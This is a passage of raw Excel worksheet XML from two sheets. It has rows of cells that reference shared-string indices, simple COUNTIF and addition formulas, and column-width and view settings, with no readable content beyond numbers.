        <v>2648</v>
      </c>
      <c r="D71" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G71" s="235" t="s">
        <v>1910</v>
      </c>
    </row>
    <row r="72" spans="1:7">
      <c r="A72" s="152">
        <v>62</v>
      </c>
      <c r="B72" s="156" t="s">
        <v>1723</v>
      </c>
      <c r="C72" s="160" t="s">
        <v>1723</v>
      </c>
      <c r="D72" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G72" s="225" t="s">
        <v>1923</v>
      </c>
    </row>
    <row r="73" spans="1:7">
      <c r="A73" s="152">
        <v>63</v>
      </c>
      <c r="B73" s="159" t="s">
        <v>2649</v>
      </c>
      <c r="C73" s="157" t="s">
        <v>2649</v>
      </c>
      <c r="D73" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G73" s="225" t="s">
        <v>1953</v>
      </c>
    </row>
    <row r="74" spans="1:7">
      <c r="A74" s="152">
        <v>64</v>
      </c>
      <c r="B74" s="156" t="s">
        <v>2650</v>
      </c>
      <c r="C74" s="160" t="s">
        <v>2650</v>
      </c>
      <c r="D74" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G74" s="225" t="s">
        <v>1953</v>
      </c>
    </row>
    <row r="75" spans="1:7">
      <c r="A75" s="152">
        <v>65</v>
      </c>
      <c r="B75" s="159" t="s">
        <v>1737</v>
      </c>
      <c r="C75" s="157" t="s">
        <v>1737</v>
      </c>
      <c r="D75" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G75" s="225" t="s">
        <v>1981</v>
      </c>
    </row>
    <row r="76" spans="1:7">
      <c r="A76" s="152">
        <v>66</v>
      </c>
      <c r="B76" s="156" t="s">
        <v>2651</v>
      </c>
      <c r="C76" s="160" t="s">
        <v>2651</v>
      </c>
      <c r="D76" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G76" s="235" t="s">
        <v>1996</v>
      </c>
    </row>
    <row r="77" spans="1:7">
      <c r="A77" s="152">
        <v>67</v>
      </c>
      <c r="B77" s="159" t="s">
        <v>2652</v>
      </c>
      <c r="C77" s="157" t="s">
        <v>2652</v>
      </c>
      <c r="D77" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G77" s="225" t="s">
        <v>2018</v>
      </c>
    </row>
    <row r="78" spans="1:7">
      <c r="A78" s="152">
        <v>68</v>
      </c>
      <c r="B78" s="159" t="s">
        <v>1756</v>
      </c>
      <c r="C78" s="157" t="s">
        <v>1756</v>
      </c>
      <c r="D78" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="E78" s="154" t="s">
        <v>2610</v>
      </c>
      <c r="G78" s="225" t="s">
        <v>2018</v>
      </c>
    </row>
    <row r="79" spans="1:7">
      <c r="A79" s="152">
        <v>69</v>
      </c>
      <c r="B79" s="156" t="s">
        <v>2653</v>
      </c>
      <c r="C79" s="157" t="s">
        <v>2653</v>
      </c>
      <c r="D79" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="G79" s="225" t="s">
        <v>2045</v>
      </c>
    </row>
    <row r="80" spans="1:7">
      <c r="A80" s="152">
        <v>70</v>
      </c>
      <c r="B80" s="159" t="s">
        <v>1825</v>
      </c>
      <c r="C80" s="160" t="s">
        <v>1825</v>
      </c>
      <c r="D80" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="81" spans="1:6">
      <c r="A81" s="152">
        <v>71</v>
      </c>
      <c r="B81" s="156" t="s">
        <v>1877</v>
      </c>
      <c r="C81" s="160" t="s">
        <v>1877</v>
      </c>
      <c r="D81" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="82" spans="1:6">
      <c r="A82" s="152">
        <v>72</v>
      </c>
      <c r="B82" s="159" t="s">
        <v>1889</v>
      </c>
      <c r="C82" s="157" t="s">
        <v>1889</v>
      </c>
      <c r="D82" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="83" spans="1:6">
      <c r="A83" s="152">
        <v>73</v>
      </c>
      <c r="B83" s="156" t="s">
        <v>1910</v>
      </c>
      <c r="C83" s="160" t="s">
        <v>1910</v>
      </c>
      <c r="D83" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="E83" s="154" t="s">
        <v>2610</v>
      </c>
    </row>
    <row r="84" spans="1:6">
      <c r="A84" s="152">
        <v>74</v>
      </c>
      <c r="B84" s="159" t="s">
        <v>2654</v>
      </c>
      <c r="C84" s="157" t="s">
        <v>2654</v>
      </c>
      <c r="D84" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="85" spans="1:6">
      <c r="A85" s="152">
        <v>75</v>
      </c>
      <c r="B85" s="156" t="s">
        <v>1923</v>
      </c>
      <c r="C85" s="160" t="s">
        <v>1923</v>
      </c>
      <c r="D85" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="86" spans="1:6">
      <c r="A86" s="152">
        <v>76</v>
      </c>
      <c r="B86" s="159" t="s">
        <v>1953</v>
      </c>
      <c r="C86" s="157" t="s">
        <v>1953</v>
      </c>
      <c r="D86" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="E86" s="154" t="s">
        <v>2610</v>
      </c>
    </row>
    <row r="87" spans="1:6">
      <c r="A87" s="152">
        <v>77</v>
      </c>
      <c r="B87" s="159" t="s">
        <v>2655</v>
      </c>
      <c r="C87" s="157" t="s">
        <v>2655</v>
      </c>
      <c r="D87" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="E87" s="154" t="s">
        <v>2610</v>
      </c>
    </row>
    <row r="88" spans="1:6">
      <c r="A88" s="152">
        <v>78</v>
      </c>
      <c r="B88" s="156" t="s">
        <v>2656</v>
      </c>
      <c r="C88" s="160" t="s">
        <v>2656</v>
      </c>
      <c r="D88" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="89" spans="1:6">
      <c r="A89" s="152">
        <v>79</v>
      </c>
      <c r="B89" s="159" t="s">
        <v>1996</v>
      </c>
      <c r="C89" s="157" t="s">
        <v>1996</v>
      </c>
      <c r="D89" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="90" spans="1:6">
      <c r="A90" s="152">
        <v>80</v>
      </c>
      <c r="B90" s="159" t="s">
        <v>2018</v>
      </c>
      <c r="C90" s="157" t="s">
        <v>2018</v>
      </c>
      <c r="D90" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="91" spans="1:6">
      <c r="A91" s="152">
        <v>81</v>
      </c>
      <c r="B91" s="156" t="s">
        <v>2045</v>
      </c>
      <c r="C91" s="160" t="s">
        <v>2045</v>
      </c>
      <c r="D91" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
      <c r="E91" s="154" t="s">
        <v>2610</v>
      </c>
    </row>
    <row r="92" spans="1:6">
      <c r="A92" s="152">
        <v>82</v>
      </c>
      <c r="B92" s="159" t="s">
        <v>2657</v>
      </c>
      <c r="C92" s="157" t="s">
        <v>2657</v>
      </c>
      <c r="D92" s="158" t="str">
        <f t="shared" si="1"/>
        <v>S</v>
      </c>
    </row>
    <row r="93" spans="1:6">
      <c r="A93" s="161" t="s">
        <v>2199</v>
      </c>
      <c r="B93" s="162">
        <v>82</v>
      </c>
      <c r="C93" s="163">
        <v>91</v>
      </c>
      <c r="D93" s="164" t="s">
        <v>2658</v>
      </c>
      <c r="E93" s="154">
        <f>COUNTIF(E2:E92,"=S")</f>
        <v>36</v>
      </c>
      <c r="F93" s="152" t="s">
        <v>2608</v>
      </c>
    </row>
    <row r="94" spans="1:6">
      <c r="A94" s="152" t="s">
        <v>2659</v>
      </c>
      <c r="B94" s="162">
        <v>74</v>
      </c>
      <c r="C94" s="163">
        <v>77</v>
      </c>
      <c r="D94" s="164" t="s">
        <v>2660</v>
      </c>
      <c r="E94" s="154">
        <f>COUNTIF(E2:E92,"=S17")</f>
        <v>9</v>
      </c>
    </row>
    <row r="95" spans="1:6">
      <c r="D95" s="164" t="s">
        <v>2661</v>
      </c>
      <c r="E95" s="154">
        <f>E93+E94</f>
        <v>45</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait"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E18"/>
  <sheetViews>
    <sheetView zoomScale="70" zoomScaleNormal="70" workbookViewId="0">
      <pane ySplit="3" topLeftCell="A13" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="AZ14" sqref="AZ14"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="12.5703125" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col min="1" max="1" width="18.42578125" style="169" customWidth="1"/>
    <col min="2" max="2" width="7.85546875" style="169" customWidth="1"/>
    <col min="3" max="3" width="13.85546875" style="169" customWidth="1"/>
    <col min="4" max="4" width="12.28515625" style="169" customWidth="1"/>
    <col min="5" max="5" width="10.140625" style="169" customWidth="1"/>
    <col min="6" max="8" width="9.7109375" style="169" customWidth="1"/>
    <col min="9" max="9" width="25.85546875" style="169" customWidth="1"/>
    <col min="10" max="15" width="8.28515625" style="169" customWidth="1"/>
    <col min="16" max="16" width="27.7109375" style="169" customWidth="1"/>
    <col min="17" max="22" width="24.7109375" style="169" customWidth="1"/>
    <col min="23" max="23" width="31.85546875" style="169" customWidth="1"/>
    <col min="24" max="29" width="26.42578125" style="169" customWidth="1"/>
    <col min="30" max="30" width="32.28515625" style="169" customWidth="1"/>
    <col min="31" max="45" width="24.85546875" style="169" customWidth="1"/>
    <col min="46" max="47" width="26" style="169" customWidth="1"/>
    <col min="48" max="52" width="24.85546875" style="169" customWidth="1"/>
    <col min="53" max="53" width="12.5703125" style="169"/>
    <col min="54" max="54" width="56.42578125" style="169" customWidth="1"/>
    <col min="55" max="16384" width="12.5703125" style="169"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:57" ht="14.25">
      <c r="A1" s="402"/>
      <c r="B1" s="402"/>
      <c r="C1" s="402"/>
      <c r="D1" s="402"/>
      <c r="E1" s="402"/>
      <c r="F1" s="402"/>
      <c r="G1" s="402"/>
      <c r="H1" s="402"/>
      <c r="I1" s="402"/>
      <c r="J1" s="402"/>
      <c r="K1" s="402"/>
      <c r="L1" s="402"/>
      <c r="M1" s="402"/>
      <c r="N1" s="402"/>
      <c r="O1" s="402"/>
      <c r="P1" s="403"/>
      <c r="Q1" s="403"/>
      <c r="R1" s="403"/>
      <c r="S1" s="403"/>
      <c r="T1" s="404"/>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c r="AU1" s="403"/>
      <c r="AV1" s="403"/>
      <c r="AW1" s="403"/>
      <c r="AX1" s="403"/>
      <c r="AY1" s="403"/>
      <c r="AZ1" s="403"/>
      <c r="BA1" s="402"/>
      <c r="BB1" s="402"/>
    </row>
    <row r="2" spans="1:57" ht="14.25">
      <c r="A2" s="402"/>
      <c r="B2" s="402"/>
      <c r="C2" s="402"/>
      <c r="D2" s="402"/>
      <c r="E2" s="402"/>
      <c r="F2" s="402"/>
      <c r="G2" s="481" t="s">
        <v>6</v>
      </c>
      <c r="H2" s="482"/>
      <c r="I2" s="482"/>
      <c r="J2" s="482"/>
      <c r="K2" s="482"/>
      <c r="L2" s="482"/>
      <c r="M2" s="483"/>
      <c r="N2" s="484" t="s">
        <v>7</v>
      </c>
      <c r="O2" s="485"/>
      <c r="P2" s="485"/>
      <c r="Q2" s="485"/>
      <c r="R2" s="485"/>
      <c r="S2" s="485"/>
      <c r="T2" s="486"/>
      <c r="U2" s="487" t="s">
        <v>8</v>
      </c>
      <c r="V2" s="488"/>
      <c r="W2" s="488"/>
      <c r="X2" s="488"/>
      <c r="Y2" s="488"/>
      <c r="Z2" s="488"/>
      <c r="AA2" s="489"/>
      <c r="AB2" s="490" t="s">
        <v>9</v>
      </c>
      <c r="AC2" s="491"/>
      <c r="AD2" s="491"/>
      <c r="AE2" s="491"/>
      <c r="AF2" s="491"/>
      <c r="AG2" s="491"/>
      <c r="AH2" s="492"/>
      <c r="AI2" s="493" t="s">
        <v>18</v>
      </c>
      <c r="AJ2" s="494"/>
      <c r="AK2" s="494"/>
      <c r="AL2" s="494"/>
      <c r="AM2" s="494"/>
      <c r="AN2" s="494"/>
      <c r="AO2" s="494"/>
      <c r="AP2" s="494"/>
      <c r="AQ2" s="494"/>
      <c r="AR2" s="480" t="s">
        <v>62</v>
      </c>
      <c r="AS2" s="480"/>
      <c r="AT2" s="480"/>
      <c r="AU2" s="480"/>
      <c r="AV2" s="480"/>
      <c r="AW2" s="480"/>
      <c r="AX2" s="480"/>
      <c r="AY2" s="480"/>
      <c r="AZ2" s="480"/>
      <c r="BA2" s="402"/>
      <c r="BB2" s="402"/>
    </row>
    <row r="3" spans="1:57" ht="32.25" customHeight="1" thickBot="1">
      <c r="A3" s="405" t="s">
        <v>2840</v>
      </c>
      <c r="B3" s="406" t="s">
        <v>2151</v>
      </c>
      <c r="C3" s="406" t="s">
        <v>2153</v>
      </c>
      <c r="D3" s="406" t="s">
        <v>2787</v>
      </c>
      <c r="E3" s="406" t="s">
        <v>2841</v>
      </c>
      <c r="F3" s="407" t="s">
        <v>2842</v>
      </c>
      <c r="G3" s="408" t="s">
        <v>2843</v>
      </c>
      <c r="H3" s="406" t="s">
        <v>2844</v>
      </c>
      <c r="I3" s="406" t="s">
        <v>2845</v>
      </c>
      <c r="J3" s="406" t="s">
        <v>96</v>
      </c>
      <c r="K3" s="406" t="s">
        <v>2846</v>
      </c>
      <c r="L3" s="406" t="s">
        <v>2847</v>
      </c>
      <c r="M3" s="409" t="s">
        <v>2848</v>
      </c>
      <c r="N3" s="410" t="s">
        <v>2843</v>
      </c>
      <c r="O3" s="414" t="s">
        <v>2844</v>
      </c>
      <c r="P3" s="414" t="s">
        <v>2845</v>
      </c>
      <c r="Q3" s="414" t="s">
        <v>96</v>
      </c>
      <c r="R3" s="414" t="s">
        <v>2846</v>
      </c>
      <c r="S3" s="415" t="s">
        <v>2847</v>
      </c>
      <c r="T3" s="411" t="s">
        <v>2848</v>
      </c>
      <c r="U3" s="416" t="s">
        <v>2843</v>
      </c>
      <c r="V3" s="414" t="s">
        <v>2844</v>
      </c>
      <c r="W3" s="414" t="s">
        <v>2845</v>
      </c>
      <c r="X3" s="414" t="s">
        <v>96</v>
      </c>
      <c r="Y3" s="414" t="s">
        <v>2846</v>
      </c>
      <c r="Z3" s="414" t="s">
        <v>2847</v>
      </c>
      <c r="AA3" s="417" t="s">
        <v>2848</v>
      </c>
      <c r="AB3" s="416" t="s">
        <v>2843</v>
      </c>
      <c r="AC3" s="414" t="s">
        <v>2844</v>
      </c>
      <c r="AD3" s="414" t="s">
        <v>2845</v>
      </c>
      <c r="AE3" s="414" t="s">
        <v>96</v>
      </c>
      <c r="AF3" s="414" t="s">
        <v>2846</v>
      </c>
      <c r="AG3" s="414" t="s">
        <v>2847</v>
      </c>
      <c r="AH3" s="417" t="s">
        <v>2848</v>
      </c>
      <c r="AI3" s="416" t="s">
        <v>2843</v>
      </c>
      <c r="AJ3" s="414" t="s">
        <v>2844</v>
      </c>
      <c r="AK3" s="414" t="s">
        <v>2849</v>
      </c>
      <c r="AL3" s="414" t="s">
        <v>2850</v>
      </c>
      <c r="AM3" s="414" t="s">
        <v>2851</v>
      </c>
      <c r="AN3" s="414" t="s">
        <v>2852</v>
      </c>
      <c r="AO3" s="414" t="s">
        <v>2846</v>
      </c>
      <c r="AP3" s="414" t="s">
        <v>2847</v>
      </c>
      <c r="AQ3" s="417" t="s">
        <v>2848</v>
      </c>
      <c r="AR3" s="416" t="s">
        <v>2843</v>
      </c>
      <c r="AS3" s="414" t="s">
        <v>2844</v>
      </c>
      <c r="AT3" s="414" t="s">
        <v>2853</v>
      </c>
      <c r="AU3" s="406" t="s">
        <v>2854</v>
      </c>
      <c r="AV3" s="414" t="s">
        <v>2851</v>
      </c>
      <c r="AW3" s="414" t="s">
        <v>2852</v>
      </c>
      <c r="AX3" s="414" t="s">
        <v>2846</v>
      </c>
      <c r="AY3" s="414" t="s">
        <v>2847</v>
      </c>
      <c r="AZ3" s="417" t="s">
        <v>2848</v>
      </c>
      <c r="BA3" s="412"/>
      <c r="BB3" s="412"/>
      <c r="BC3" s="413"/>
      <c r="BD3" s="413"/>
      <c r="BE3" s="413"/>
    </row>
    <row r="4" spans="1:57" customFormat="1" ht="14.25">
      <c r="A4" s="418" t="s">
        <v>2157</v>
      </c>
      <c r="B4" s="419" t="s">
        <v>2158</v>
      </c>
      <c r="C4" s="419" t="s">
        <v>2159</v>
      </c>
      <c r="D4" s="419"/>
      <c r="E4" s="419">
        <v>2</v>
      </c>
      <c r="F4" s="419">
        <v>2</v>
      </c>
      <c r="G4" s="419"/>
      <c r="H4" s="419"/>
      <c r="I4" s="419" t="s">
        <v>12</v>
      </c>
      <c r="J4" s="419">
        <v>0</v>
      </c>
      <c r="K4" s="420"/>
      <c r="L4" s="420"/>
      <c r="M4" s="420"/>
      <c r="N4" s="420"/>
      <c r="O4" s="420"/>
      <c r="P4" s="419" t="s">
        <v>12</v>
      </c>
      <c r="Q4" s="419">
        <v>0</v>
      </c>
      <c r="R4" s="420"/>
      <c r="S4" s="419"/>
      <c r="T4" s="421"/>
      <c r="U4" s="421"/>
      <c r="V4" s="422"/>
      <c r="W4" s="423" t="s">
        <v>2160</v>
      </c>
      <c r="X4" s="419">
        <v>1</v>
      </c>
      <c r="Y4" s="424"/>
      <c r="Z4" s="424"/>
      <c r="AA4" s="424"/>
      <c r="AB4" s="424"/>
      <c r="AC4" s="424"/>
      <c r="AD4" s="420"/>
      <c r="AE4" s="419" t="s">
        <v>12</v>
      </c>
      <c r="AF4" s="424"/>
      <c r="AG4" s="424"/>
      <c r="AH4" s="424"/>
      <c r="AI4" s="424"/>
      <c r="AJ4" s="424"/>
      <c r="AK4" s="419" t="s">
        <v>12</v>
      </c>
      <c r="AL4" s="425" t="s">
        <v>12</v>
      </c>
      <c r="AM4" s="424"/>
      <c r="AN4" s="424"/>
      <c r="AO4" s="424"/>
      <c r="AP4" s="424"/>
      <c r="AQ4" s="424"/>
      <c r="AR4" s="424"/>
      <c r="AS4" s="424"/>
      <c r="AT4" s="424"/>
      <c r="AU4" s="425" t="s">
        <v>12</v>
      </c>
      <c r="AV4" s="424"/>
      <c r="AW4" s="424"/>
      <c r="AX4" s="424"/>
      <c r="AY4" s="424"/>
      <c r="AZ4" s="426"/>
    </row>
    <row r="5" spans="1:57" customFormat="1" ht="14.25">
      <c r="A5" s="427" t="s">
        <v>2161</v>
      </c>
      <c r="B5" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C5" s="428" t="s">
        <v>2162</v>
      </c>
      <c r="D5" s="428"/>
      <c r="E5" s="428">
        <v>61</v>
      </c>
      <c r="F5" s="428">
        <v>16</v>
      </c>
      <c r="G5" s="428"/>
      <c r="H5" s="428"/>
      <c r="I5" s="428" t="s">
        <v>12</v>
      </c>
      <c r="J5" s="428">
        <v>0</v>
      </c>
      <c r="K5" s="429"/>
      <c r="L5" s="429"/>
      <c r="M5" s="429"/>
      <c r="N5" s="429"/>
      <c r="O5" s="429"/>
      <c r="P5" s="428" t="s">
        <v>12</v>
      </c>
      <c r="Q5" s="428">
        <v>0</v>
      </c>
      <c r="R5" s="429"/>
      <c r="S5" s="428"/>
      <c r="T5" s="430"/>
      <c r="U5" s="430"/>
      <c r="V5" s="431"/>
      <c r="W5" s="428" t="s">
        <v>2093</v>
      </c>
      <c r="X5" s="428">
        <v>3</v>
      </c>
      <c r="Y5" s="432"/>
      <c r="Z5" s="432"/>
      <c r="AA5" s="432"/>
      <c r="AB5" s="432"/>
      <c r="AC5" s="432"/>
      <c r="AD5" s="429"/>
      <c r="AE5" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AF5" s="432"/>
      <c r="AG5" s="432"/>
      <c r="AH5" s="432"/>
      <c r="AI5" s="432"/>
      <c r="AJ5" s="432"/>
      <c r="AK5" s="433">
        <v>9999</v>
      </c>
      <c r="AL5" s="429" t="s">
        <v>12</v>
      </c>
      <c r="AM5" s="432"/>
      <c r="AN5" s="432"/>
      <c r="AO5" s="432"/>
      <c r="AP5" s="432"/>
      <c r="AQ5" s="432"/>
      <c r="AR5" s="432"/>
      <c r="AS5" s="432"/>
      <c r="AT5" s="432"/>
      <c r="AU5" s="433">
        <v>1</v>
      </c>
      <c r="AV5" s="432"/>
      <c r="AW5" s="432"/>
      <c r="AX5" s="432"/>
      <c r="AY5" s="432"/>
      <c r="AZ5" s="434"/>
    </row>
    <row r="6" spans="1:57" customFormat="1" ht="28.5">
      <c r="A6" s="427" t="s">
        <v>2163</v>
      </c>
      <c r="B6" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C6" s="428" t="s">
        <v>2164</v>
      </c>
      <c r="D6" s="428"/>
      <c r="E6" s="428">
        <v>40</v>
      </c>
      <c r="F6" s="428">
        <v>17</v>
      </c>
      <c r="G6" s="428"/>
      <c r="H6" s="428"/>
      <c r="I6" s="428" t="s">
        <v>12</v>
      </c>
      <c r="J6" s="428">
        <v>0</v>
      </c>
      <c r="K6" s="429"/>
      <c r="L6" s="429"/>
      <c r="M6" s="429"/>
      <c r="N6" s="429"/>
      <c r="O6" s="429"/>
      <c r="P6" s="428">
        <v>51037</v>
      </c>
      <c r="Q6" s="428">
        <v>1</v>
      </c>
      <c r="R6" s="429"/>
      <c r="S6" s="428"/>
      <c r="T6" s="430"/>
      <c r="U6" s="430"/>
      <c r="V6" s="431"/>
      <c r="W6" s="428" t="s">
        <v>2165</v>
      </c>
      <c r="X6" s="428">
        <v>4</v>
      </c>
      <c r="Y6" s="432"/>
      <c r="Z6" s="432"/>
      <c r="AA6" s="432"/>
      <c r="AB6" s="432"/>
      <c r="AC6" s="432"/>
      <c r="AD6" s="429"/>
      <c r="AE6" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AF6" s="432"/>
      <c r="AG6" s="432"/>
      <c r="AH6" s="432"/>
      <c r="AI6" s="432"/>
      <c r="AJ6" s="432"/>
      <c r="AK6" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AL6" s="433" t="s">
        <v>12</v>
      </c>
      <c r="AM6" s="432"/>
      <c r="AN6" s="432"/>
      <c r="AO6" s="432"/>
      <c r="AP6" s="432"/>
      <c r="AQ6" s="432"/>
      <c r="AR6" s="432"/>
      <c r="AS6" s="432"/>
      <c r="AT6" s="432"/>
      <c r="AU6" s="433" t="s">
        <v>12</v>
      </c>
      <c r="AV6" s="432"/>
      <c r="AW6" s="432"/>
      <c r="AX6" s="432"/>
      <c r="AY6" s="432"/>
      <c r="AZ6" s="434"/>
    </row>
    <row r="7" spans="1:57" customFormat="1" ht="142.5">
      <c r="A7" s="427" t="s">
        <v>2166</v>
      </c>
      <c r="B7" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C7" s="428" t="s">
        <v>2167</v>
      </c>
      <c r="D7" s="428"/>
      <c r="E7" s="428">
        <v>15649</v>
      </c>
      <c r="F7" s="428">
        <v>2866</v>
      </c>
      <c r="G7" s="428"/>
      <c r="H7" s="428"/>
      <c r="I7" s="428" t="s">
        <v>2168</v>
      </c>
      <c r="J7" s="428">
        <v>10</v>
      </c>
      <c r="K7" s="429"/>
      <c r="L7" s="429"/>
      <c r="M7" s="429"/>
      <c r="N7" s="429"/>
      <c r="O7" s="429"/>
      <c r="P7" s="428" t="s">
        <v>2168</v>
      </c>
      <c r="Q7" s="428" t="s">
        <v>12</v>
      </c>
      <c r="R7" s="429"/>
      <c r="S7" s="428"/>
      <c r="T7" s="430"/>
      <c r="U7" s="430"/>
      <c r="V7" s="431"/>
      <c r="W7" s="428" t="s">
        <v>2169</v>
      </c>
      <c r="X7" s="428">
        <v>29</v>
      </c>
      <c r="Y7" s="432"/>
      <c r="Z7" s="432"/>
      <c r="AA7" s="432"/>
      <c r="AB7" s="432"/>
      <c r="AC7" s="432"/>
      <c r="AD7" s="429"/>
      <c r="AE7" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AF7" s="432"/>
      <c r="AG7" s="432"/>
      <c r="AH7" s="432"/>
      <c r="AI7" s="432"/>
      <c r="AJ7" s="432"/>
      <c r="AK7" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AL7" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AM7" s="432"/>
      <c r="AN7" s="432"/>
      <c r="AO7" s="432"/>
      <c r="AP7" s="432"/>
      <c r="AQ7" s="432"/>
      <c r="AR7" s="432"/>
      <c r="AS7" s="432"/>
      <c r="AT7" s="432"/>
      <c r="AU7" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AV7" s="432"/>
      <c r="AW7" s="432"/>
      <c r="AX7" s="432"/>
      <c r="AY7" s="432"/>
      <c r="AZ7" s="434"/>
    </row>
    <row r="8" spans="1:57" customFormat="1" ht="71.25">
      <c r="A8" s="427" t="s">
        <v>2170</v>
      </c>
      <c r="B8" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C8" s="428" t="s">
        <v>2171</v>
      </c>
      <c r="D8" s="428"/>
      <c r="E8" s="428">
        <v>3421</v>
      </c>
      <c r="F8" s="428">
        <v>715</v>
      </c>
      <c r="G8" s="428"/>
      <c r="H8" s="428"/>
      <c r="I8" s="428" t="s">
        <v>2172</v>
      </c>
      <c r="J8" s="428">
        <v>2</v>
      </c>
      <c r="K8" s="429"/>
      <c r="L8" s="429"/>
      <c r="M8" s="429"/>
      <c r="N8" s="429"/>
      <c r="O8" s="429"/>
      <c r="P8" s="428" t="s">
        <v>2172</v>
      </c>
      <c r="Q8" s="428">
        <v>2</v>
      </c>
      <c r="R8" s="429"/>
      <c r="S8" s="428"/>
      <c r="T8" s="430"/>
      <c r="U8" s="430"/>
      <c r="V8" s="431"/>
      <c r="W8" s="428" t="s">
        <v>2173</v>
      </c>
      <c r="X8" s="428">
        <v>14</v>
      </c>
      <c r="Y8" s="432"/>
      <c r="Z8" s="432"/>
      <c r="AA8" s="432"/>
      <c r="AB8" s="432"/>
      <c r="AC8" s="432"/>
      <c r="AD8" s="429"/>
      <c r="AE8" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AF8" s="432"/>
      <c r="AG8" s="432"/>
      <c r="AH8" s="432"/>
      <c r="AI8" s="432"/>
      <c r="AJ8" s="432"/>
      <c r="AK8" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AL8" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AM8" s="432"/>
      <c r="AN8" s="432"/>
      <c r="AO8" s="432"/>
      <c r="AP8" s="432"/>
      <c r="AQ8" s="432"/>
      <c r="AR8" s="432"/>
      <c r="AS8" s="432"/>
      <c r="AT8" s="432"/>
      <c r="AU8" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AV8" s="432"/>
      <c r="AW8" s="432"/>
      <c r="AX8" s="432"/>
      <c r="AY8" s="432"/>
      <c r="AZ8" s="434"/>
    </row>
    <row r="9" spans="1:57" customFormat="1" ht="99.75">
      <c r="A9" s="427" t="s">
        <v>2174</v>
      </c>
      <c r="B9" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C9" s="428" t="s">
        <v>2175</v>
      </c>
      <c r="D9" s="428"/>
      <c r="E9" s="428">
        <v>44016</v>
      </c>
      <c r="F9" s="428">
        <v>7531</v>
      </c>
      <c r="G9" s="428"/>
      <c r="H9" s="428"/>
      <c r="I9" s="428" t="s">
        <v>2176</v>
      </c>
      <c r="J9" s="428">
        <v>5</v>
      </c>
      <c r="K9" s="429"/>
      <c r="L9" s="429"/>
      <c r="M9" s="429"/>
      <c r="N9" s="429"/>
      <c r="O9" s="429"/>
      <c r="P9" s="428" t="s">
        <v>2176</v>
      </c>
      <c r="Q9" s="428">
        <v>5</v>
      </c>
      <c r="R9" s="429"/>
      <c r="S9" s="428"/>
      <c r="T9" s="430"/>
      <c r="U9" s="430"/>
      <c r="V9" s="431"/>
      <c r="W9" s="428" t="s">
        <v>2177</v>
      </c>
      <c r="X9" s="428">
        <v>20</v>
      </c>
      <c r="Y9" s="432"/>
      <c r="Z9" s="432"/>
      <c r="AA9" s="432"/>
      <c r="AB9" s="432"/>
      <c r="AC9" s="432"/>
      <c r="AD9" s="429"/>
      <c r="AE9" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AF9" s="432"/>
      <c r="AG9" s="432"/>
      <c r="AH9" s="432"/>
      <c r="AI9" s="432"/>
      <c r="AJ9" s="432"/>
      <c r="AK9" s="428" t="s">
        <v>12</v>
      </c>
      <c r="AL9" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AM9" s="432"/>
      <c r="AN9" s="432"/>
      <c r="AO9" s="432"/>
      <c r="AP9" s="432"/>
      <c r="AQ9" s="432"/>
      <c r="AR9" s="432"/>
      <c r="AS9" s="432"/>
      <c r="AT9" s="432"/>
      <c r="AU9" s="435" t="s">
        <v>12</v>
      </c>
      <c r="AV9" s="432"/>
      <c r="AW9" s="432"/>
      <c r="AX9" s="432"/>
      <c r="AY9" s="432"/>
      <c r="AZ9" s="434"/>
    </row>
    <row r="10" spans="1:57" customFormat="1" ht="99.75">
      <c r="A10" s="427" t="s">
        <v>2178</v>
      </c>
      <c r="B10" s="428" t="s">
        <v>2158</v>
      </c>
      <c r="C10" s="428" t="s">
